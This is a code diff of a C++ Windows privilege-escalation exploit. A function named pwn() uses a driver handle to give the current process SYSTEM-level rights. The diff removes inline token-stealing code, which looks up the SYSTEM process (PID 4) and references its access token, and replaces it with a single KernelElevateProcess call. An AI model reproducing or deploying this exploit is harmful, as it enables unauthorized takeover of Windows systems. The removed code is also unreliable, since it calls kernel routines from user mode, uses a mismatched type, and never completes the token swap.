@@ -8,16 +8,11 @@
 #include <future>
 #include "kernel.h"
 
-int currentProcessId = NULL;
+int processId = GetCurrentProcessId();
 
 void pwn()
 {
-	SYSTEM_PROCESS_INFO systemProcessInfo;
-	SYSTEM_PROCESS_INFO currentProcessInfo;
-	PsLookupProcessByProcessId((HANDLE)4, &systemProcessInfo);
-	PsLookupProcessByProcessId((HANDLE)currentProcessId, &currentProcessInfo);
-	PACCESS_TOKEN targetToken = PsReferencePrimaryToken(currentProcessInfo);
-	PACCESS_TOKEN systemToken = PsReferencePrimaryToken(systemProcessInfo);
+	KernelElevateProcess(processId);
 }
 
 int main() 
@@ -37,8 +32,6 @@ int main()
 
 	if (driver != INVALID_HANDLE_VALUE && InitializeKernel())
 	{
-		currentProcessId = GetCurrentProcessId();
-
 		std::cout << std::endl;
 
 		std::cout << "Found handle: 0x" << std::hex << handle << std::endl;
